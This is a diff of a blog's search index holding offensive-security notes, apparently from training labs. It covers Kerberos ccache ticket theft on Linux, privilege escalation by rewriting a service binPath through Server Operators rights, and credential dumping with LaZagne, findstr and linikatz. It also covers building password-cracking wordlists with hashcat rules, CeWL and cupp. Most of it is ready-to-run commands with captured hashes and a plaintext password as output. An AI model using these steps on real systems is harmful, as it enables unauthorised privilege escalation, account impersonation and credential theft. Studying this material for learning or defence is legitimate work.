-    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
-
-<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
-<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
-
-<p>Example</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
-
-<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Ticket (Ptt)</category>
-        <category>KeyTab Ccache Abuse</category>
-      </categories>
-      <tags>
-        <tag>klist</tag>
-        <tag>ccache</tag>
       </tags>
   </entry>
   <entry>
@@ -1496,6 +1496,106 @@
       </tags>
   </entry>
   <entry>
+    <title>Server Operators</title>
+    <url>/2026/03/06/Server-Operators-1/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Server Operators</title>
+    <url>/2026/03/06/Server-Operators/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Members of the <code>Server Operators</code> group may have <code>SERVICE_ALL_ACCESS</code> or <code>SERVICE_CHANGE_CONFIG</code> permissions on certain services. These permissions allow modification of the service configuration, including the <code>binPath</code>.</p>
+<p>➜ If the targeted service runs as <code>LocalSystem</code>, modifying its <code>binPath</code> allows execution of arbitrary commands with <code>NT AUTHORITY\SYSTEM</code> privileges, resulting in full local privilege escalation.</p>
+</blockquote>
+<h3 id="Enumerating-Services-Running-as-LocalSystem-and-Controllable-by-Server-Operators"><a href="#Enumerating-Services-Running-as-LocalSystem-and-Controllable-by-Server-Operators" class="headerlink" title="Enumerating Services Running as LocalSystem and Controllable by Server Operators"></a>Enumerating Services Running as <code>LocalSystem</code> and Controllable by <code>Server Operators</code></h3><blockquote>
+<p>To identify exploitable services, we enumerate all services running under the <code>LocalSystem</code> account and filter those where the <code>Server Operators</code> group has sufficient permissions.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.StartName <span class="operator">-eq</span> <span class="string">&quot;LocalSystem&quot;</span>&#125; | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$sd</span> = sc.exe sdshow <span class="variable">$_</span>.Name</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sd</span> <span class="operator">-match</span> <span class="string">&quot;\(A;;(FA|[^;]*CC[^;]*);;;SO\)&quot;</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;[+] Exploitable Service: <span class="variable">$</span>(<span class="variable">$_</span>.Name)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    StartName : <span class="variable">$</span>(<span class="variable">$_</span>.StartName)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    State     : <span class="variable">$</span>(<span class="variable">$_</span>.State)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;    Path      : <span class="variable">$</span>(<span class="variable">$_</span>.PathName)&quot;</span></span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; &gt; C:\Users\server_adm\Desktop\exploitable_services.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: AppReadiness</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Stopped</span><br><span class="line">    Path      : C:\Windows\System32\svchost.exe <span class="literal">-k</span> AppReadiness <span class="literal">-p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: MozillaMaintenance</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Stopped</span><br><span class="line">    Path      : <span class="string">&quot;C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Exploitable Service: Themes</span><br><span class="line">    StartName : LocalSystem</span><br><span class="line">    State     : Running</span><br><span class="line">    Path      : C:\Windows\System32\svchost.exe <span class="literal">-k</span> netsvcs <span class="literal">-p</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Selecting-a-Safe-Exploitation-Target"><a href="#Selecting-a-Safe-Exploitation-Target" class="headerlink" title="Selecting a Safe Exploitation Target"></a>Selecting a Safe Exploitation Target</h3><blockquote>
+<p>➜ To minimize operational impact and maintain system stability, priority should be given to services that meet the following criteria:</p>
+<ul>
+<li>Third-party services</li>
+<li>Custom services</li>
+<li>Non-critical Windows services</li>
+</ul>
+<p>And :</p>
+<ul>
+<li>Services configured with <code>START_TYPE : DEMAND_START</code></li>
+</ul>
+</blockquote>
+<h3 id="Modifying-the-Service-Binary-Path"><a href="#Modifying-the-Service-Binary-Path" class="headerlink" title="Modifying the Service Binary Path"></a>Modifying the Service Binary Path</h3><blockquote>
+<p>➜ By modifying the <code>service binary path</code> and injecting a malicious command, we can add our user to the local Administrators group.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\server_adm&gt; sc.exe config MozillaMaintenance binPath= <span class="string">&quot;cmd.exe /c net localgroup Administrators server_adm /add&quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
+
+<h3 id="Starting-the-Service"><a href="#Starting-the-Service" class="headerlink" title="Starting the Service"></a>Starting the Service</h3><blockquote>
+<p>➜ Starting the service fails, which is expected because the service binary path was replaced with cmd.exe, which executes the malicious command as SYSTEM and exits immediately without behaving like a real service, causing Windows to report a timeout while the payload still runs successfully.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\server_adm&gt; sc.exe <span class="built_in">start</span> MozillaMaintenance</span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] StartService FAILED <span class="number">1053</span>:</span><br><span class="line">The service did not respond to the <span class="built_in">start</span> or control request <span class="keyword">in</span> a timely fashion.</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜ Then we can dump hashes from the DC.</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>Groups</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows Pass the Hash (PtH)</title>
     <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
     <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
@@ -1522,57 +1622,6 @@
       <tags>
         <tag>mimikatz</tag>
         <tag>Invoke-TheHash</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Writing Custom Wordlists and Rules</title>
-    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
-    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
-
-<p>Example :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
-<ul>
-<li>Depth to spider (<code>-d</code>)</li>
-<li>The minimum length of the word (<code>-m</code>)</li>
-<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
-<li>The file where we want to store the results (<code>-w</code>)</li>
-</ul>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
-<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
-
-<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
-<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
-
-<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Writing Custom Wordlists and Rules</category>
-      </categories>
-      <tags>
-        <tag>Creds</tag>
-        <tag>CeWL</tag>
-        <tag>Cupp</tag>
-        <tag>Hashcat Rules</tag>
       </tags>
   </entry>
   <entry>
@@ -1650,51 +1699,54 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+    <title>Writing Custom Wordlists and Rules</title>
+    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
+    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
+
+<p>Example :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
 <ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
+<li>Depth to spider (<code>-d</code>)</li>
+<li>The minimum length of the word (<code>-m</code>)</li>
+<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
+<li>The file where we want to store the results (<code>-w</code>)</li>
 </ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
+<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
 
 
-]]></content>
+
+<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
+
+<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
+<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
+
+<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Writing Custom Wordlists and Rules</category>
       </categories>
       <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
+        <tag>Creds</tag>
+        <tag>CeWL</tag>
+        <tag>Cupp</tag>
+        <tag>Hashcat Rules</tag>
       </tags>
   </entry>
 </search>
